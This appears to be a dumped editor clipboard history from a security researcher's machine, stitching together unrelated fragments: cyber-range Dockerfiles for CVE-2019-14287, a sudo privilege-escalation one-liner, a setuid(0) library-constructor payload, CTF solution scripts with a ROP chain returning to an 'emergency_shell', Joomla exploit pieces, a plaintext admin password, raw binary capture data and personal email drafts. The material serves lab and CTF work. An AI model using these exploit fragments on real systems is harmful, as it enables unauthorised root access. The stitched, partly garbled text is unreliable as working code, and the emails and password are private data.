eda1d1400aa1a02ff29cb9bca99efa86|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|12|1|v|python
	__stream_handler
bfcfd5d5d4a32504005011f8ebc7d772|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|8|1|V|python
	# from flask import has_request_context, request
	# from flask.logging import default_handler
	# import logging
	
	# class RequestFormatter(logging.Formatter):
	#     def format(self, record):
	#         if has_request_context():
	#             record.url = request.url
	#             record.remote_addr = request.remote_addr
	#         else:
	#             record.url = None
	#             record.remote_addr = None
	
	#         return super().format(record)
	
	# formatter = RequestFormatter(
	#     '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	#     '%(levelname)s in %(module)s: %(message)s'
	# )
	
	# logging_handler = logging.FileHandler("example.log",mode="w")
	# logging_handler.setLevel(logging.DEBUG)
	# logging_handler.setFormatter(formatter)
	
	# log = logging.getLogger('werkzeug')
	# log.setLevel(logging.DEBUG)
	# log.addHandler(logging_handler)
	
89eb574a0f9c92686440da11431e750d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/temp.py|26|1|V|python
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.DEBUG)
	log.addHandler(logging_handler)
4e608106bde656e203ebe5935ec8f2e2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|12|27|v|python
	RequestFormatter(
	    '[%(asctime)s %(levelname)s] requested: %(url)s, id: %(id)s in %(module)s: %(message)s'
	)
010972111af064ac0594d216053022d4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|20|35|V|python
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.DEBUG)
	log.addHandler(file_handler)
5c974a49f4c7d189bb1773f5d3d96028|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/temp.py|9|1|V|python
	            record.url = request.url
	            record.remote_addr = request.remote_addr
3c8f6872f54f939e688ad8374bf4061a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|8|1|V|python
	
	            record.url = request.url
da213e30b0b2fb36afa9c0fef6019dc2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|6|9|V|python
	        record.id = request.args.get('id')
a35a38df0d612b2a1ce52ab463ddd057|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|12|71|^v|python
	: %(message)s'
08ffc4521828fd9a4316a9af94a98edb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|22|6|V|python
	    app.logger.debug('Headers: %s', request.headers)
	    app.logger.debug('Body: %s', request.get_data())
2afc0febf812181ae89d073d51f732d3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/run_bots.sh|1|1|V|sh
	QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/xssbot.js
	QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/csrfbot.js
	
e4b9a786e7baf6a03cf055522a58c3e6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/run_bots.sh|1|1|V|sh
	QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/xssbot.js
	QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/csrfbot.js
f70d9686575b35fa080a8976d0006c58|file:///home/neo/247ctf/web/include.php|4|1|V|php
	  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
a9e16edde0a5e07bb809048906e9f6a7|file:///home/neo/247ctf/networking/sol_custom.py|49|1|V|python
	for num, val in magic_nums.items():
	    if val != 1:
	        print(num, val)
782267e2020cb68ab9e06a87d16bd3e1|file:///home/neo/247ctf/networking/sol_custom.py|8|1|V|python
	from hashlib import md5sum
a7f7ee36d380494740063105d574127b|file:///home/neo/247ctf/networking/sol_custom.py|33|9|V|python
	        print(bytes.fromhex(md5(contents).hexdigest()))
4759eb8632681220c06f4f4a2cc6df1e|file:///home/neo/247ctf/networking/sol_custom.py|8|1|V|python
	from hashlib import md5
6b25bdd7801441571440cb41191ba813|file:///home/neo/247ctf/networking/sol_custom.py|49|35|V|python
	        print(long_to_bytes(magic))
	        print(zlib.crc32(contents))
155a55ffe543e8088f0dcdf7e6d3dbd6|file:///home/neo/247ctf/networking/sol_custom.py|50|9|V|python
	        print(zlib.crc32(contents))
2fb748d6d9fecf0a10c64557f904db57|file:///home/neo/247ctf/networking/sol_custom.py|6|1|V|python
	print(prefix)
4c47f38a1fbb715f76b372970caed0a8|file:///home/neo/247ctf/networking/sol_custom.py|5|11|v|python
	str(0)
85afac8ea6b0c6dd6cadd21541fd1055|file:///home/neo/247ctf/networking/sol_custom.py|7|1|V|python
	prefix = bytes.fromhex(prefix)
2673495f0922b700353746358ab78a34|file:///home/neo/247ctf/networking/sol_custom.py|10|1|V|python
	payload += b'\x00'.hex()
d2e1110bc2587430eb6e8c1645716979|file:///home/neo/247ctf/networking/parse_custom.py|33|28|v|python
	, payload)
08af16be3d125da982428962484c98ee|file:///home/neo/247ctf/networking/sol_custom.py|12|12|v|python
	bytes([seq]).hex()
f822b06e95f4f9513ee84d9f18236ae9|file:///home/neo/247ctf/networking/sol_custom.py|19|1|V|python
	seq += 1
0a0a67556a6a72affbb830e61d7f039f|file:///home/neo/247ctf/networking/sol_custom.py|14|12|v|python
	bytes([command]).hex()
5d5e0a0c8287f733ab0f7fa3e9d85f33|file:///home/neo/247ctf/networking/sol_custom.py|9|1|V|python
	prefix = '95f0a612'
438b76e80d5d6c5da32410645c35bcce|file:///home/neo/247ctf/networking/sol_custom.py|4|12|v|python
	'ab73744336677f07.247ctf.com'
1028a0d1e9f701c1b628f6e3b2b7789c|file:///home/neo/247ctf/networking/sol_custom.py|4|1|V|python
	r = remote(, 50112)
1439c3f421ca5dd2459c25fb0b6c25e8|file:///home/neo/247ctf/networking/sol_custom.py|11|1|V|python
	print(SYNACK)
9221b79a945c46fffe526163a9c6c509|file:///home/neo/247ctf/networking/sol_custom.py|17|1|V|python
	prefix = r.recvline().strip().decode()
ac67d0384832e97e0a01678a9149cc58|file:///home/neo/247ctf/networking/sol_custom.py|13|1|V|python
	print(packet)
d97a1aab55993b7f319dc5b1bc7cf6bf|file:///home/neo/247ctf/networking/sol_custom.py|23|1|V|python
	print(bytes.fromhex(payload))
4f9fbd9fe68bc826fec522374eef65ac|file:///home/neo/247ctf/networking/sol_custom.py|11|1|V|python
	ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
168c1a284d99ac363d7a5654bc15ae9f|file:///home/neo/247ctf/networking/sol_custom.py|13|10|v|python
	sr1(ip/ACK).load.strip().decode()
4b5d19197fef2036dabc617fde414e6f|file:///home/neo/247ctf/networking/sol_custom.py|12|23|v|python
	.load.strip().decode()
c4c5468098a5d5b36151439848c39173|file:///home/neo/247ctf/networking/sol_custom.py|12|1|v|python
	RECEIVED
bb8252c1e33f97e68bd0267282ef31dc|file:///home/neo/247ctf/networking/sol_custom.py|14|1|V|python
	received = sr1(ip/ACK)
7017c4d07522b727a39d36b56ddd161f|file:///home/neo/247ctf/networking/sol_custom.py|30|1|V|python
	packet=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
c7d774d4d26290e0b7493c4639e84adf|file:///home/neo/247ctf/networking/sol_custom.py|30|53|v|python
	SYNACK
30127ab802fbe7d179924aa43f1eb8ff|file:///home/neo/247ctf/networking/sol_custom.py|12|1|V|python
	print(len(SYNACK.load))
a6bf79554bfbb087d8c426cfaf3efe69|file:///home/neo/247ctf/networking/sol_custom.py|15|1|V|python
	print(received['TCP'].show())
4e4a43c9f8b450026972c601f4c0b0a9|file:///home/neo/247ctf/networking/sol_custom.py|36|1|V|python
	# r.send(payload)
1cf9b64415b3f6697f1a02a60c0e6800|file:///home/neo/247ctf/networking/sol_custom.py|36|1|V|python
	# packet = r.recvline()
e47f95f1a3fce9107ce43775c88626c8|file:///home/neo/247ctf/networking/sol_custom.py|36|1|V|python
	# print(packet)
9e9bcca4f4ba4c53e1371a036595eb50|file:///home/neo/247ctf/networking/sol_custom.py|12|1|V|python
	print(SYNACK.show())
4e2b42cb87f824f874f2e2a189458ec5|file:///home/neo/247ctf/networking/sol_custom.py|38|1|V|python
	# print(packet.show())
d42de185f7df4513ac342434d6f1c4eb|file:///home/neo/247ctf/networking/sol_custom.py|5|1|V|python
	sport = random.randint(1024,65535)
2a856eda6720ea7a36a8bd3317e4d85f|file:///home/neo/247ctf/networking/sol_custom.py|19|1|V|python
	# print(prefix)
cf5987263b0f253c925298bfea3d8507|file:///home/neo/247ctf/networking/sol_error.py|3|1|V|python
	pcap = rdpcap("error_reporting.pcap")
	packets = PacketList([p for p in pcap])
b3885ab1c0c5496613a970b49468e35b|file:///home/neo/247ctf/networking/sol_zeroes.py|3|16|v|python
	error_reporting
693cb835bbf67c34985b4954e12f4620|file:///home/neo/247ctf/networking/sol_zeroes.py|3|16|v|python
	00.pcap
48feda8ad3ce0fda4e6db8f013d7940b|file:///home/neo/247ctf/networking/sol_zeroes.py|12|19|V|python
	        print(data)
	        print(len(data))
98c7e3cb45ef89b90da994096a6a3ac3|file:///home/neo/247ctf/networking/sol_zeroes.py|5|1|V|python
	iv = b'\x00' * 16
08a5b170cc94d1562b259ce543feee88|file:///home/neo/247ctf/networking/sol_zeroes.py|14|1|V|python
	        print(data)
8a2f577b3dff37138bcc778b0319e868|file:///home/neo/247ctf/networking/sol_zeroes.py|12|5|V|python
	i = 0
	for packet in packets:
fc5d9d43c5d58df1cf63bcf7e5f83321|file:///home/neo/247ctf/networking/sol_zeroes.py|12|1|V|python
	i = 0
93e717485a442c7676b057ed2e78a580|file:///home/neo/247ctf/networking/sol_zeroes.py|15|16|V|python
	    print(i, packet.addr2)
	    break
81bfc852ec1f0df82e7592fd6b43519e|file:///home/neo/247ctf/networking/sol_zeroes.py|15|5|V|python
	    # try:
af6ec402e3509f43339b2c530e17a6a6|file:///home/neo/247ctf/networking/sol_zeroes.py|11|1|V|python
	print(len(packets))
bf9eedf16f5dc90dd6d96706131ebb41|file:///home/neo/247ctf/networking/sol_zeroes.py|5|1|V|python
	key = b'\x00' * 16
d1632aa41a4608f04266b6f0f60a288e|file:///home/neo/247ctf/networking/sol_zeroes.py|17|9|V|python
	        cipher.update(data)
a25f6c7a89d1e1373ddff030c11dbc8b|file:///home/neo/247ctf/networking/sol_zeroes.py|16|15|v|python
	 '00:0f:00:54:3b:d6'
45acde8667a8417d5051801878096099|file:///home/neo/247ctf/networking/sol_zeroes.py|13|1|V|python
	cipher.update(data)
b1f29534cf32bf0138fd9231d0eab741|file:///home/neo/247ctf/networking/sol_zeroes.py|12|1|V|python
	cipher = AES.new(key, AES.MODE_CCM, iv) 
b61a983c3a39700042598af4dedea287|file:///home/neo/247ctf/networking/sol_zeroes.py|19|13|V|python
	            cipher.update(data)
5b8952202ba9690e15c1b96a627922f0|file:///home/neo/247ctf/networking/sol_zeroes.py|21|9|V|python
	        data = packet.data
04b730309b0107f87bfcbf72083a46e0|file:///home/neo/247ctf/networking/sol_zeroes.py|20|13|V|python
	            f = False
35619bd7dbc2dcd0c8017e6aa6f82e72|file:///home/neo/247ctf/web/include.php|4|3|V|php
	  echo var_dump($fp);
232ff6882f042cb298f13489421db888|file:///home/neo/247ctf/web/include.php|5|1|V|php
	  echo ' ';
c4940182d7221b3a94e04bef1d903729|file:///home/neo/247ctf/web/include.php|7|8|v|php
	array_values
0d6e4e6dc497fcf183aa87047378910d|file:///home/neo/247ctf/web/include.php|7|8|v|php
	print_r
03fab55a8f75dcb103cff5739d1e07d4|file:///home/neo/cyberranges/work/mitre/cve-2019-14287/Dockerfile|3|1|V|dockerfile
	RUN apt-get update && \
	      apt-get -y install sudo
	
	RUN useradd -m docker && echo "docker:docker" | chpasswd && adduser docker sudo
	
cb1f5f9086196883f16a9c7f65c731e9|file:///home/neo/cyberranges/work/mitre/cve-2019-14287/Dockerfile|3|1|V|dockerfile
	USER docker
e9db0de3e7c4c18f2dd780ea609d82fb|file:///home/neo/cyberranges/work/mitre/cve-2019-14287/Dockerfile|4|1|V|dockerfile
	      apt-get -y install sudo
06496fcbb2ea718b4e2747e76512728d|file:///home/neo/cyberranges/work/mitre/cve-2019-14287/exploit|3|1|V|
	sudo -u#-1 /bin/bash
da7e32281f78a47db42bcadf62eb48ed|file:///home/neo/cyberranges/work/mitre/scenarios.md|1|1|V|vimwiki
	### Easy1
a15e0fd5f042c74755fe79086899aca6|file:///home/neo/cyberranges/work/mitre/easy2/notes|1|1|V|
	- sudo cve container stops immidiately after starting in the producer, because it runs /bin/bash as the command and exits immiately after executing it. If the CMS is added in the same container, the container won't stop immidiately
	- CVE for bigtreecms says it is a Windows vulnerability. Should I try and install it on a linux docker container to see if it also works for linux? It will take too much time, not sure if it is worth it.
	- If we add both cves in one docker container, in which exploit in the producer will we put it
2302d07256ad78da33815a7ca10ba011|file:///home/neo/cyberranges/work/mitre/scenarios.md|8|5|V|vimwiki
	    - CVE-2017-9428 (BigTree CMS Dir Traversal) - See notes
5441218ef76562bd68b3613087b32cc2|file:///home/neo/cyberranges/work/mitre/scenarios.md|10|1|V|vimwiki
	### Easy4
32de03472537da0b3e7a15678cef8273|file:///home/neo/247ctf/networking/sol_zeroes.py|8|40|v|python
	[12:]
3d292bd0e42686cef6878c4e823dd403|file:///home/neo/247ctf/networking/sol_zeroes.py|19|18|v|python
	'00:0f:00:54:3b:d6':
124878de42c1b4176aaf89216059637d|file:///home/neo/247ctf/networking/sol_zeroes.py|14|9|V|python
	    try:
	        packet['dot11'].show()
	    except:
	        pass
a846d24a94022bfb457a32cb1a69b33e|file:///home/neo/247ctf/networking/sol_zeroes.py|12|1|V|python
	f = True
2da401f1e4004f578d6f57d1b353f34f|file:///home/neo/247ctf/networking/file.hex|1|1|V|hex
	HTTP/1.1 200 OK
	Date: Fri, 10 Apr 2020 05:25:26 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Fri, 10 Apr 2020 00:45:10 GMT
	ETag: "27ebc7b-5a2e50bae477f"
	Accept-Ranges: bytes
	Content-Length: 41860219
	Content-Type: application/zip
	
3bf9fe53418d23561ff82d9e365af9ed|file:///home/neo/247ctf/networking/part1.raw|1|1|V|
	




'¬Æ√ß6


E
√úS√ï@
@√á@
	
	
P¬ß}√¶¬≥¬Ç¬â3√ê¬û√ú¬ö


	√π¬†(√ªWd 21O√¢√ú√î√ª¬ª
√òo¬Ö¬î¬£¬Ö√≥¬®√ì√ÖL{8√®¬Å¬öfYrRX¬¨√ék$√Ü√í&√µ√ï¬ß¬™¬ï¬Ωm√ü¬∞o-¬ô¬â√©=9s√ùM%√¢*j¬ä√ê6√¶$√ç¬í¬ïj¬á? l!_¬ík¬åNb√Ü¬†¬§(¬≥√≠X¬∫r¬ª√Ö ¬ã]√¥√èZ√ã√¨¬¢√º¬ñ¬†GJ&√£y¬ùV\v*D¬™¬Ω¬©b√ì√•6¬ßH#¬°¬µ¬¨m[m_√Ç6¬Ø√ì¬Éj¬ñ√Ø`√ö¬£√¨R}F√ï¬®P√∫√Ü√ï√áW√∞¬ç¬™[#j√æ¬µ!¬¥mQ√∂((√ë√ê√ö¬ÄL¬ØJ¬ø√å*¬∂7¬µ&√à√ö¬äA√ØP¬â√π+√∫6}√ïX¬æj√Ä√º¬ï√∂¬ä√ªC|¬äM√ï}¬í¬øh(/√¨T√§√£zh√ç¬ß √ºCj)√´E √∑¬™Vr¬ï=√Ö|¬∏¬®¬ö√∑U√≤¬†¬•√≤¬ä¬æ√ëF¬≤}√´√ç¬Ω√®{¬üz¬î√ÉR/qST9√çH√Ω¬™√Ω¬ê¬Ø¬£V√å¬∂¬°√µ¬ç¬´√∏F√î¬ì√∫¬ç¬´B√°U√è√¢6¬©¬∑√ø
¬´b¬™`√¶¬é√ìC¬ê√≥O√π¬ÅP√Ω@√ö¬á√ê6¬£S
b√ë√≠R¬à¬∞m[m_√Ö6¬©¬Ñ@¬¢¬ø¬ÑmQ√è¬á¬µ?@mN√âk√äm_¬¢√ï/√ëT¬ì√ò¬õW√∞¬ç¬´√ø√ôPK?





aU¬äP












$













flag/
	
 






X&2√Ω√ê√ñX&2√Ω√ê√ñ√¨Dbd√ê√ñPK?

	




HU¬äP√Ö√†uB'√â
B'√â

$






 


#


flag/ALSO_NOT_A_FLAG.jpg
	
 






|¬ó(√°√ê√ñ|¬ó(√°√ê√ñ~l√°√ê√ñPK?




¬ßT¬äPO√à
	¬ê¬•
√π¬¨

$






 


¬õ'√â
flag/Flag.jpg
	
 






8√ã¬Å-√ê√ñ8√ã¬Å-√ê√ñn¬´p-√ê√ñPK?




¬òT¬äP√á¬Ñ9eT√ã
T√í

$






 


V√ç√ä
flag/Here.jpg
f812e249c2f7611ec8ce451f506bdfb1|file:///home/neo/cyberranges/work/mitre/scenarios.md|2|1|V|vimwiki
	    - Can't find exploit in producer
	    - Can't find poc for exploit
cc74f9198043b901766bb376b45f1fb4|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|8|1|V|dockerfile
	RUN useradd -m hacker && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
	
	RUN echo "hacker:hacker" | chpasswd
	
	# RUN apt-get -y install systemd apache2 && systemctl enable apache2 && systemctl start apache2
58d466b66716f3c578eb41de411d2dac|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|12|1|V|dockerfile
	# RUN apt-get -y install systemd apache2 && systemctl enable apache2 && systemctl start apache2
f19b77dc1b80ab7ba26b96517f58c09f|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|8|21|v|dockerfile
	r && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
0151af68a84dd6d2d2a96712ba58978b|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|3|1|V|dockerfile
	RUN apt-get update && \
	    apt-get install -y wget && \
	    wget https://www.sudo.ws/sudo/dist/packages/1.8.27/sudo_1.8.27-1_ubu1804_amd64.deb && \
	    dpkg -i sudo_1.8.27-1_ubu1804_amd64.deb
6c0d8217610210850f36ccad50ccc251|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|5|5|v|dockerfile
	echo "hacker:hacker" | chpasswd
bdfd4d29406818e8b5f11d01d59c0646|file:///home/neo/cyberranges/work/mitre/easy2/Dockerfile|3|1|V|dockerfile
	RUN apt-get update && \
a73bddda11f609f50782b1d82813c373|untitled:4|11|16|v|
	$eiuid
d528f5453c266a343142712886872128|untitled:4|1|1|V|
	echo "" > pwn.c
	cat <<EOT >> pwn.c
	
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdio.h>
	 
	void __attribute((constructor)) initLibrary(void) {
	        printf("Escape lib is initialized");
	        printf("[LO] uid:%d | euid:%d%c", getuid(), geteuid());  
	        setuid(0);
	        printf("[LO] uid%d | euid:%d%c", getuid(), geteuid());
	}
	
	EOT
baba31178afad2f04afaa818cf378272|untitled:4|1|1|V|
	echo "" > pwn.c
	cat <<EOT >> pwn.c
	
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdio.h>
	 
	void __attribute((constructor)) initLibrary(void) {
	        printf("Escape lib is initialized");
	        printf("[LO] uid:%d | euid:%d%c", getuid(), geteuid());  
	        setuid(1001);
	        printf("[LO] uid%d | euid:%d%c", getuid(), geteuid());
	}
	
	EOT
03555b2030ffdd0c2178878046fdd958|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|11|1|V|dockerfile
	RUN echo "hacker:hacker" | chpasswd
c8e81f2df1e8e09b3f558147f88bfe72|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|8|11|v|dockerfile
	hacker:hacker
7ecf259ed5f26d2b76d170046bad1bac|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|3|1|V|dockerfile
	RUN useradd -m hacker
10828729e0cbe6584a8776560919f414|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|9|1|V|dockerfile
	RUN echo "admin:j&5n&7C6x7#1ncX)" | chpasswd
	RUN echo "hacker:hacker" | chpasswd
a824927d0c10fdadec591975626f7125|file:///home/neo/cyberranges/work/mitre/easy6/0001-suidbash.patch|5|55|v|gitsendemail
	d894cfd
2f2bc38c6c73615fc4a694cf1d66c742|file:///home/neo/cyberranges/work/mitre/easy6/Dockerfile|13|26|V|dockerfile
	# Set suid for bash (root)
	# RUN chown admin:admin /bin/bash && chmod 4755 /bin/bash
2be1da4828a0b543a01ff790a1394f30|file:///tmp/neomutt-neo-1000-2059718-15436866576773682201|1|1|V|mail
	Hello,
	
	Sure, the WordPress files are here: https://bitbucket.org/srecgrp/auth.js-source/src/master/ . Only the modified files are included in the repository so you should be able to easily see the changes compared to the original wordpress files I mentioned in my previous email.
	
	I also mention the specific changes I made in the
	wordpress-instructions.md file, so you can take a look at that too to
	make sure what the changes are.
	
	Please let me know if you need anything else.
	
	Neophytos Christou
a7bcbc88ab0f8d043e663160888c1400|file:///tmp/neomutt-neo-1000-2059718-7477379763227297307|15|1|V|mail
	Hello,
	
	Sure, the modified WordPress files are here:
	https://bitbucket.org/srecgrp/auth.js-source/src/master/
	
	Only the modified files are included in the repository, so you should be
	able to easily find the modifications compared to the original WordPress
	files I mentioned in my previous email. Also, I mention the specific
	changes I made in the wordpress-instructions.md file, so you can also
	take a look at that to see the specific functions I added/modified.
	
	Please let me know if you need anything else.
	
	Neophytos Christou
787361a21177eca71edccb08daf48589|file:///tmp/neomutt-neo-1000-2186435-17722257549649522116|3|1|v|mail
	Sure
e6793e336ecb4bbc834faeee97aa571d|file:///home/neo/cyberranges/work/mitre/scenarios.md|44|9|V|vimwiki
	        - Can't find exploit in producer - probably exists but search doesn't work correctly
a86bc3bafc3e7dc07dd7cde4a752eded|file:///home/neo/cyberranges/work/mitre/scenarios.md|44|9|V|vimwiki
	        - https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562
fe8569b26b98487a81ce93c254a2f09e|file:///home/neo/cyberranges/work/mitre/easy7/Joomla_CVE-2015-8562/joomla-cve-2015-8562.py|57|17|V|python
	                print(url)
bfcbf8ed1ebe90b5d2c55cf7496f7ff4|file:///home/neo/cyberranges/work/mitre/easy7/Joomla_CVE-2015-8562/joomla-cve-2015-8562.py|103|1|V|python
				command = raw_input('\033[1;37;10m$ ')
b7ba3a5edb9f7165532148a1a60e6f10|file:///home/neo/cyberranges/work/mitre/scenarios.md|46|9|V|vimwiki
	        - Can't get exploit working but it probably works
3464aafedcd66a4dfa7ebb117e21378b|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|54|7|v|python
	p32(emergency_shell)
81e5f5472df02cfbb5352f11ee9d0746|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|48|1|V|python
	password = b"Authorized"
a4066a358bcf1236ca53ee9a34a228f2|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|50|1|V|python
	patch_auth = exe.sym.patch_auth
b1eae6dea06228b61fb5c0d72e2d45a9|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|48|1|V|python
	offset -= len(password)
5e80c6606fe26246a6ba5a9b2926597e|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|56|1|V|python
	payload += p32(patch_auth)
465669772da02de9f1109b8293cd49d8|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|57|1|V|python
	payload += p32(patch_auth2)
096bd4ae7bfa116735cff30ce453933d|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|59|1|V|python
	payload += p32(patch_auth3)
bfa032b0afd270f544de86295c1eb849|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|56|1|V|python
	
	aaa * offset
	return address of patch_auth
	return to main
	parameter1
c8c6fe22d1c2d4ccd7b523cbd4e7db34|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|60|27|v|python
	# arg of patch_auth2
e465c2cb6357ed0ea454bb2e357ebb51|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|59|1|V|python
	payload += p32(0xdeadbeef) # arg of patch_auth
813ed115a0a96a744ac300dde9d8baf0|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|58|1|V|python
	payload += p32(pop_ret)
011c8e42790c6e51e8c9414c06544a8a|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|73|1|V|python
	payload += p32(0xbad45f0c)
b80b3562371012275c3524feca448212|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|74|16|v|python
	0xbad45f0c
25565bfd8e700ab5590d6d5c719e0ad9|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|74|1|V|python
	payload += p32(0xba73d00d)
d0854105e756c21337ec99b8e2135b4e|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|75|16|v|python
	0xba73d00d
2856c6d5fbbf815ee8d5751b6a79e333|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|75|1|V|python
	payload += p32(0xb00b1355)
58225431eff72b4b144b720c90161a30|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|76|16|v|python
	0xb00b1355
dbae22a4201f169dce9795651cad2002|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|69|16|v|python
	patch_auth3
b0413fb7fdf5fb94bc987cf7fd1fb02b|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|72|1|V|python
	payload += b'AAAA'
9ed509466bae73a6fdc0c14f84ba2291|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|57|11|v|python
	0x080ae306
d779d1c7bd1bf97a72b9e2bbcd0c1945|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|58|9|v|python
	0x81fffd18 
349960cf6eb5a5d25c29de1db89b8c1a|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|77|18|v|python
	0xa73f00d
3a2d0011f673705a8c178e21db5b5d6a|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|72|16|v|python
	0x81fffd18 ^ 0xa73f00d
6b258030ea06c4cd01baa293ffb59b01|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|75|1|V|python
	payload += b"junkjunk"
1e4617e43288406d534b7158366c8d15|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|75|1|V|python
	log.info("%s" % hex(0x81fffd18 ^ 0xa73f00d))
725d91977f189d4930c6344b016d55de|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|6|31|v|python
	authenticator
5954bd2907ed01f0d05043e860285cfd|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|63|1|V|python
	payload += p32(patch_auth)
	payload += p32(pop1)
	payload += p32(0xdeadbeef) # arg of patch_auth
	payload += p32(patch_auth2)
	payload += p32(pop2)
	payload += p32(0xd15ea5e) # arg of patch_auth2
	payload += p32(0xbadf00d) # arg of patch_auth2
	payload += p32(ret)
	payload += p32(pop_eax_edx_ebx)
	payload += p32(0x81fffd18 ^ 0xa73f00d)
	payload += b"junkjunk"
	payload += p32(xor_eax_0x81fffd18)
	payload += p32(push_eax)
	payload += p32(patch_auth3)
	payload += p32(pop3)
	payload += p32(0xbadf4c3d)
	payload += p32(0xa73f00d)
	payload += p32(0xf4ceb00b)
	payload += p32(patch_auth4)
	payload += p32(emergency_shell)
	payload += p32(0xbad45f0c)
	payload += p32(0xba73d00d)
	payload += p32(0xb00b1355)
	payload += p32(0x1337d00d)
	
5c7f0a7fdf8c7131243a5364f3f685f1|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|49|1|V|python
	patch_auth = exe.sym.patch_auth
	patch_auth2 = exe.sym.patch_auth2
	patch_auth3 = exe.sym.patch_auth3
	patch_auth4 = exe.sym.patch_auth4
	pop3 = 0x08049773
	pop2 = 0x08049774
	pop1 = 0x08049775
	push_eax = 0x080584b8
	pop_eax_edx_ebx = 0x0805e8b4
	xor_eax_0x81fffd18 = 0x08078367
	ret = 0x0808dc99
40523613a965c415fcbc0f941b5aebc2|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|49|1|V|python
	log_addr("Emerg:", emergency_shell)
6cf06219f0310ef48af4e61259c11a9c|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|83|1|V|python
	payload += p32(0xbad45f0c)
	payload += p32(0xba73d00d)
	payload += p32(0xb00b1355)
	payload += p32(0x1337d00d)
5866e4cf91e6ff664b8958637d473545|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|82|1|V|python
	payload += p32(emergency_shell)
f3a1355c77403b82fa9918696ba79513|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|81|1|V|python
	payload += p32(patch_auth4)
1d6ff9e3a880b58ba11372d42a4f6458|file:///tmp/neomutt-neo-1000-2059718-12321078515451075557|13|1|V|mail
	The location looksdd
9c17cd5467c5e87ed272ab4c9808abdf|file:///tmp/neomutt-neo-1000-2059718-12321078515451075557|13|12|V|mail
	The location looks really good, the only thing I'm a bit concerned with
	is the price
1f192fc98d67c86aa343ba0d7f8825ed|file:///tmp/neomutt-neo-1000-2059718-12321078515451075557|13|1|V|mail
	Also, if I may ask, 
75a1f28a3cb02e5fba16021c05e4d8eb|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|52|1|V|python
	patch_auth4 = exe.sym.patch_auth4
